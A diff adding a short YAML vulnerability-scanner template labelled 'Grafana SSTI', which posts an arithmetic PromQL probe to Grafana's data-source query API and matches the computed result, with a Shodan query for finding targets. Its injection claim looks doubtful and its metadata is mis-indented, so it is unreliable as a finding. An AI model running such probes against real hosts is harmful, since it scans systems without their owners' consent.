@@ -1,0 +1,26 @@
+id: Grafana-SSTI
+
+info:
+  name: Grafana SSTI
+  author: Momika233
+    shodan-query: grafana
+
+http:
+  - raw:
+      - |
+        POST /api/ds/query HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0
+        Content-Type: application/json
+
+        {"queries":[{"datasource":{"uid":"sbwEfjHMk","type":"prometheus"},"editorMode":"code","expr":"(5201315-1)","instant":false,"interval":"","intervalFactor":1,"legendFormat":"Node","refId":"A","queryType":"timeSeriesQuery","exemplar":false,"requestId":"21A","utcOffsetSec":28800,"datasourceId":1,"intervalMs":3600000,"maxDataPoints":143}],"range":{"from":"2023-05-08T01:58:09.369Z","to":"2023-05-15T01:58:09.369Z","raw":{"from":"now-7d","to":"now"}},"from":"1683511089369","to":"1684115889369"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '5201314'
+
+      - type: status
+        status:
+          - 200
